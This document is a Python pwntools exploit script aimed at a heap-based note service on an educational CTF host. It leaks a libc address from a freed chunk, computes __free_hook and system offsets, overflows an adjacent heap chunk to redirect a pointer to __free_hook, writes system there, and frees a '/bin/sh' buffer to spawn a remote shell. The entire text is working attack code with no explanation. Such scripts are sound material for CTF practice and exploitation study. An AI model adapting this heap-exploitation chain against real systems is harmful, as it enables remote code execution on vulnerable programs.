from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10007)

# add 0 
print(r.recvuntil(b'> '))
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(0).encode())
print(r.recvuntil(b'> ')) # note name
r.sendline('AAAAAAAAAAAAAAAA'.encode())

# edit 0
print(r.recvuntil(b'> '))
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(0).encode())
print(r.recvuntil(b'> ')) # size
r.sendline(str(0x418).encode())
r.send('A\x00'.encode())

# add 1
print(r.recvuntil(b'> '))
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # note name
r.sendline('BBBBBBBBBBBBBBBB'.encode())

# edit 1
print(r.recvuntil(b'> '))
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # size
r.sendline(str(0x18).encode())
r.send('B\x00'.encode())

# add 2
print(r.recvuntil(b'> '))
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # note name
r.sendline('CCCCCCCCCCCCCCCC'.encode())

# delete 0
print(r.recvuntil(b'> '))
r.sendline(str(3).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(0).encode())

# show
print(r.recvuntil(b'> '))
r.sendline(str(4).encode())
print(r.recvuntil(b'data: '))
main_arena = u64(r.recv(6).ljust(8, b'\x00'))
libc_base = main_arena - 0x1ecbe0
free_hook = libc_base + 0x1eee48
system = libc_base + 0x52290

# edit 1 with overflow 
binsh = b'/bin/sh\x00'.ljust(0x10, b'B')
overflow_chunk = flat(
    0, 0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook
)
print(r.recvuntil(b'> '))
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(1).encode())
print(r.recvuntil(b'> ')) # size
r.sendline(str(0x38).encode())
r.send(binsh + overflow_chunk)

# edit 2
print(r.recvuntil(b'> '))
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # size
r.sendline(str(0x8).encode())
r.send(p64(system))

# delete 1
print(r.recvuntil(b'> '))
r.sendline(str(3).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(1).encode())
r.interactive()
